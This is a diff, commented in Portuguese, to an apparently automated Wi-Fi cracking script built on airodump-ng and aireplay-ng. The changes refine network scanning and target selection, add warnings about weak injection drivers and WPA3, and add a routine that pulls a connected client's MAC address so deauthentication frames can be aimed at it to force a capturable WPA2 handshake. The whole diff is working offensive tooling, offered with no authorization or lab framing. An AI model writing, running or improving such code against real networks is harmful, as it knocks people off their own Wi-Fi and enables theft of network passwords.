@@ -40,6 +40,7 @@ ROTA_USADA=""
 IP_ROTEADOR=""
 SOMENTE_DADOS=0
 MONITOR_MODE_ATIVO=0   # controla o cleanup: só restaura se realmente entrou em modo monitor
+CLEANUP_FEITO=0        # garante que a limpeza rode UMA vez (Ctrl+C disparava INT e depois EXIT)
 
 # Máscara informada na Rota A — reutilizada pela Rota D (PMKID) para quebrar
 # o hash capturado sem depender de handshake/cliente conectado.
@@ -80,6 +81,13 @@ confirmar() {
 # ============================================================================
 
 cleanup() {
+    # Idempotente: ao dar Ctrl+C, o bash dispara o trap em INT e DE NOVO em EXIT,
+    # o que rodava a limpeza (e o restart do NetworkManager) duas vezes seguidas.
+    # Desarmamos o trap e marcamos a flag para só rodar uma vez.
+    [[ "${CLEANUP_FEITO}" -eq 1 ]] && return
+    CLEANUP_FEITO=1
+    trap - EXIT INT TERM
+
     log "Executando limpeza / restauração da interface..."
 
     if [[ -n "${MONIFACE}" ]] && iw dev "${MONIFACE}" info &>/dev/null; then
@@ -192,6 +200,28 @@ detectar_interface() {
         exit 1
     fi
     log "Usando interface física: ${IFACE}"
+    avisar_driver_fraco
+}
+
+# Alguns drivers (em especial Realtek rtw88/RTL88xx) têm modo monitor e, pior,
+# INJEÇÃO de pacotes instáveis ou quebrados. Isso impacta direto deauth, WPS e
+# PMKID (que dependem de injetar quadros) e também o scan (perde beacons ao
+# trocar de canal). Avisamos cedo em vez de falhar silenciosamente mais adiante.
+avisar_driver_fraco() {
+    local drv=""
+    drv="$(basename "$(readlink -f "/sys/class/net/${IFACE}/device/driver" 2>/dev/null)" 2>/dev/null)"
+    [[ -z "$drv" || "$drv" == "driver" ]] && return 0
+    log "Driver da interface ${IFACE}: ${drv}"
+    if [[ "$drv" =~ ^(rtw88|rtw89|rtl8821|rtl8812|rtl8188|rtl8192|8821|8812|8188|8192) ]]; then
+        echo
+        echo ">>> AVISO: o driver '${drv}' é de uma placa Realtek com modo monitor e"
+        echo ">>> INJEÇÃO de pacotes historicamente instáveis. Consequências práticas:"
+        echo ">>>   - deauth/WPS/PMKID podem não injetar nada (falham sem erro claro);"
+        echo ">>>   - o scan pode perder redes ao trocar de canal (lista incompleta)."
+        echo ">>> A captura passiva de handshake (quando alguém conecta) ainda costuma"
+        echo ">>> funcionar. Se possível, use um adaptador com injeção confiável."
+        echo
+    fi
 }
 
 # ============================================================================
@@ -271,14 +301,18 @@ garantir_moniface_viva() {
 
 escanear_e_escolher_alvo() {
     garantir_moniface_viva
-    log "Escaneando redes nas bandas a/b/g (2.4 GHz e 5 GHz) por 15s..."
+    # 25s (antes 15s): com --band abg o airodump salta ~38 canais (2.4+5GHz),
+    # dwell de ~250ms cada. Em 15s dava só ~1,5 varreduras e redes fracas (e o
+    # canal do alvo) escapavam — por isso a lista da etapa 1 vinha incompleta e
+    # divergia do que aparecia depois, já travado num canal, na captura.
+    log "Escaneando redes nas bandas a/b/g (2.4 GHz e 5 GHz) por 25s..."
 
     rm -f "${SCAN_PREFIX}"*.csv "${SCAN_PREFIX}"*.cap "${SCAN_PREFIX}"*.kismet.* 2>/dev/null
 
     # --kill-after força SIGKILL se o processo não morrer com SIGTERM dentro
     # de 5s extras — sem isso, "timeout" pode ficar esperando pra sempre se
     # o airodump-ng não terminar limpo (ex.: travado restaurando o terminal).
-    timeout --kill-after=5 15s airodump-ng --band abg --write "${SCAN_PREFIX}" --output-format csv "${MONIFACE}" &>>"$LOGFILE"
+    timeout --kill-after=5 25s airodump-ng --band abg --write "${SCAN_PREFIX}" --output-format csv "${MONIFACE}" &>>"$LOGFILE"
 
     local csv="${SCAN_PREFIX}-01.csv"
     if [[ ! -f "$csv" ]]; then
@@ -301,28 +335,53 @@ escanear_e_escolher_alvo() {
 
     # Parseia cada linha em: BSSID, Channel, Privacy, Power, ESSID
     declare -a lista_bssid lista_ch lista_enc lista_pwr lista_essid
+    declare -A bssid_visto
 
     for linha in "${linhas_ap[@]}"; do
         IFS=',' read -ra campos <<< "$linha"
         # índices do formato padrão airodump CSV (0-based):
-        # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power
-        local bssid ch privacy power essid
+        # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power, 9 #beacons
+        local bssid ch privacy power essid beacons
         bssid="$(echo "${campos[0]}" | xargs)"
         ch="$(echo "${campos[3]}" | xargs)"
         privacy="$(echo "${campos[5]}" | xargs)"
         power="$(echo "${campos[8]}" | xargs)"
+        beacons="$(echo "${campos[9]}" | xargs)"
         # O CSV do airodump sempre termina em "..., ID-length, ESSID, Key".
         # O último campo (Key) costuma vir vazio — o ESSID é o penúltimo.
         # (usar $NF pegava o campo "Key" vazio, deixando tudo como <oculto>)
         essid="$(echo "${campos[-2]}" | xargs)"
 
         [[ -z "$bssid" ]] && continue
+
+        # Descarta "fantasmas": o airodump cria uma linha de AP para todo BSSID
+        # que ele vê num frame de DADOS de um cliente, mesmo nunca tendo recebido
+        # um beacon dele. Esses vêm com "# beacons = 0", canal -1 e sem ESSID/
+        # privacidade — não são redes reais e eram justamente o que poluía a
+        # lista da etapa 1 (ex.: BSSIDs só "probados" por estações no scan).
+        if [[ "$beacons" =~ ^[0-9]+$ ]] && (( beacons == 0 )); then
+            continue
+        fi
+        # Sem canal válido não dá nem pra travar a captura depois — ignora.
+        if ! [[ "$ch" =~ ^[0-9]+$ ]] || (( ch <= 0 )); then
+            continue
+        fi
+        # De-duplica por BSSID (mantém a 1ª ocorrência) por segurança.
+        [[ -n "${bssid_visto[$bssid]:-}" ]] && continue
+        bssid_visto[$bssid]=1
+
         lista_bssid+=("$bssid")
         lista_ch+=("$ch")
         lista_enc+=("$privacy")
         lista_pwr+=("${power:--100}")
         lista_essid+=("${essid:-<oculto>}")
     done
+
+    if [[ ${#lista_bssid[@]} -eq 0 ]]; then
+        erro "Só apareceram entradas fantasma (0 beacons) no scan — nenhuma rede real."
+        erro "Rode de novo (sinal fraco / driver perdendo beacons ao trocar de canal)."
+        exit 1
+    fi
 
     # Ordena índices por potência (mais perto de 0 = sinal melhor) no topo
     mapfile -t ordem < <(
@@ -367,6 +426,32 @@ escanear_e_escolher_alvo() {
     fi
 
     log "Alvo escolhido: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"
+    avisar_limitacoes_cripto
+}
+
+# Avisa quando o alvo usa WPA3/SAE. Isso muda o jogo e o script não deve fingir
+# que as rotas normais vão funcionar:
+#   - deauth é protegido por PMF/802.11w no WPA3 → o cliente ignora os quadros;
+#   - o handshake SAE (Dragonfly) NÃO é quebrável por dicionário/máscara como o
+#     4-way do WPA2 — hashcat -m 22000 e aircrack atacam EAPOL/PMKID do WPA2,
+#     não o SAE. As rotas A/C/D só têm chance pelo lado WPA2 de uma rede em
+#     "modo transição" (WPA3 WPA2), se algum cliente conectar via WPA2.
+avisar_limitacoes_cripto() {
+    local enc_up="${TARGET_ENC^^}"
+    if [[ "$enc_up" == *WPA3* || "$enc_up" == *SAE* ]]; then
+        echo
+        echo ">>> AVISO: o alvo usa WPA3/SAE (${TARGET_ENC})."
+        echo ">>>   - deauth é protegido por PMF/802.11w → será IGNORADO pelo cliente;"
+        echo ">>>   - o handshake SAE NÃO quebra por dicionário/máscara (diferente do WPA2)."
+        if [[ "$enc_up" == *WPA2* ]]; then
+            echo ">>> Como a rede está em modo transição (WPA3 WPA2), ainda há uma chance"
+            echo ">>> SE um cliente conectar pelo lado WPA2 — aí sim o 4-way vira atacável."
+        else
+            echo ">>> Esta rede é WPA3 puro: as rotas de dicionário/máscara/PMKID não se"
+            echo ">>> aplicam. Siga ciente de que provavelmente não vão encontrar a senha."
+        fi
+        echo
+    fi
 }
 
 # ============================================================================
@@ -410,6 +495,21 @@ ha_cliente_conectado() {
     csv="$(ls -t "${CAPTURE_PREFIX}"-[0-9]*.csv 2>/dev/null | grep -vE '\.(kismet|log)\.csv$' | head -1)"
     [[ -n "$csv" && -f "$csv" ]] || return 1
     awk '/^Station MAC/{f=1} f' "$csv" | grep -qi "${TARGET_BSSID}"
+}
+
+# Ecoa o MAC do PRIMEIRO cliente associado ao BSSID alvo (ou nada). Deauth
+# broadcast (-a BSSID só) é largamente ignorado por clientes modernos; deauth
+# DIRECIONADO a um cliente específico (-a BSSID -c CLIENTE) é muito mais eficaz
+# pra forçar a reconexão que gera o handshake. O CSV tem o MAC na coluna 1 da
+# seção de estações e o BSSID associado na coluna 6.
+cliente_do_alvo() {
+    local csv
+    csv="$(ls -t "${CAPTURE_PREFIX}"-[0-9]*.csv 2>/dev/null | grep -vE '\.(kismet|log)\.csv$' | head -1)"
+    [[ -n "$csv" && -f "$csv" ]] || return 1
+    awk -F', *' -v b="${TARGET_BSSID}" '
+        /^Station MAC/ { f=1; next }
+        f && toupper($6)==toupper(b) && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ { print $1; exit }
+    ' "$csv"
 }
 
 capturar_handshake() {
@@ -463,8 +563,15 @@ capturar_handshake() {
             # Tem cliente associado agora: só vale a pena mandar deauth aqui
             # (se ele só acabou de conectar, o handshake normal da conexão
             # já deve aparecer sozinho na próxima checagem, sem precisar disso).
-            log "Tentativa $((tentativas+1)): cliente conectado detectado — enviando deauth (pode não funcionar em redes com PMF/802.11w ou canais DFS)..."
-            aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE" || true
+            local cliente
+            cliente="$(cliente_do_alvo)"
+            if [[ -n "$cliente" ]]; then
+                log "Tentativa $((tentativas+1)): cliente ${cliente} detectado — deauth DIRECIONADO (pode não funcionar em redes com PMF/802.11w ou canais DFS)..."
+                aireplay-ng --deauth 5 -a "${TARGET_BSSID}" -c "${cliente}" "${MONIFACE}" &>>"$LOGFILE" || true
+            else
+                log "Tentativa $((tentativas+1)): cliente conectado detectado (sem MAC específico) — deauth broadcast..."
+                aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE" || true
+            fi
         else
             log "Tentativa $((tentativas+1)): nenhum cliente conectado detectado ainda — aguardando conexão..."
         fi
